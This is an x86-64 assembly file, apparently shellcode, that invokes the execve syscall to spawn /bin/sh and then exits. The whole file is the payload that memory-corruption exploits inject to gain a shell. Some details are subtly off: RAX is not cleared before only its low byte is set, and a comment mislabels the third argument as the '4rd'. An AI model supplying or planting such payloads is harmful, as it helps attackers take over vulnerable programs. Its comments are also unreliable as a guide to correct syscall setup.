global _start

section .text
_start:
    mov al, 59          ; execve syscall number
    xor rdx, rdx        ;  4rd argument -> set env to NULL
    push rdx            ; push NULL string terminator
    mov rdi, '/bin//sh' ; first arg to /bin/sh
    push rdi            ; push to stack
    mov rdi, rsp        ; move pointer to ['/bin//sh']
    push rdx            ; push NULL string terminator
    push rdi            ; push second arg to ['/bin//sh']
    mov rsi, rsp        ; pointer to args
    syscall

	xor rax , rax
	mov rax , 60
	xor rdi ,rdi
	syscall
